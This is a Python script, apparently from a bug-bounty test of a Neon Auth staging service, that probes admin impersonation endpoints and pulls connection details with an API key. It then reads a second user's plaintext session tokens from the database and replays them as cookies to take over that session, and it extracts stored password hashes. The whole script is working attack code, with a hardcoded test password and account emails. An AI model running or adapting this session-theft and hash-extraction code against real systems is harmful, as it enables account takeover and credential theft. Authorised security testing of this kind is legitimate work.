# -*- coding: utf-8 -*-
"""V28: A. impersonate endpoint probe (admin plugin, impersonatedBy col exists)
B. DB plaintext session token -> API impersonation proof (U2's token, test acct)
C. account password hash format + count"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()
PASS = "SecTest!2026pass"
U2 = "libobo1229+na_org2@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000", timeout=25):
    conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
    hdrs = {"Content-Type": "application/json", "Origin": origin,
            "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    if cookie:
        hdrs["Cookie"] = cookie
    conn.request(method, path, json.dumps(body).encode() if body is not None else None, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    ck = resp.getheader("Set-Cookie", "")
    conn.close()
    time.sleep(0.25)
    return resp.status, data, ck


def main():
    import psycopg
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    out("== V28 impersonate + session-steal ==")
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
                 "?database_name=neondb&role_name=neondb_owner"
                 "&branch_id=br-wandering-field-w2ob6mpn",
                 headers={"X-Bug-Bounty": "xxbo",
                          "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
    r = conn.getresponse()
    uri = json.loads(r.read().decode())["uri"]
    conn.close()
    p = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
    uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
    # A. impersonate endpoint existence (anonymous + authed)
    paths = ["/neondb/auth/admin/impersonate-user", "/neondb/auth/admin/stop-impersonating",
             "/neondb/auth/admin/list-sessions", "/neondb/auth/admin/impersonate"]
    for pth in paths:
        st, d, _ = na("POST", pth, {"userId": "66b42c6b-c41e-4c5a-a2fa-aa5957cfaec0"})
        out("%-45s anon -> %s %s" % (pth, st, d[:90]))
    # authed (U1)
    st, d, ck = na("POST", "/neondb/auth/sign-in/email",
                   {"email": "libobo1229+na_org1@gmail.com", "password": PASS})
    c1 = ck.split(";")[0]
    for pth in ("/neondb/auth/admin/impersonate-user", "/neondb/auth/admin/stop-impersonating"):
        st, d, _ = na("POST", pth, {"userId": "66b42c6b-c41e-4c5a-a2fa-aa5957cfaec0"}, c1)
        out("%-45s U1   -> %s %s" % (pth, st, d[:90]))
    # B. steal U2 session token from DB -> API call
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute('SELECT token, "expiresAt" FROM neon_auth.session '
                        "WHERE \"userId\"='66b42c6b-c41e-4c5a-a2fa-aa5957cfaec0' "
                        'AND "expiresAt" > now() ORDER BY "createdAt" DESC LIMIT 3')
            rows = cur.fetchall()
            out("U2 live sessions: %d" % len(rows))
            for tok, exp in rows:
                # impersonate U2 via stolen token
                st, d, _ = na("GET", "/neondb/auth/get-session",
                              cookie="__Secure-neon-auth.session_token=" + tok)
                out("stolen-token get-session -> %s %s" % (st, d[:160]))
                st, d, _ = na("GET", "/neondb/auth/organization/list",
                              cookie="__Secure-neon-auth.session_token=" + tok)
                out("stolen-token org/list   -> %s %s" % (st, d[:120]))
                break
    # C. password hash format
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute("SELECT email, password FROM neon_auth.account WHERE providerId='credential' LIMIT 3")
            for email, pw in cur.fetchall():
                salt, h = str(pw).split(":", 1)
                out("hash: %s salt_len=%d hash_len=%d" % (email, len(salt), len(h)))
    out("done")


if __name__ == "__main__":
    main()
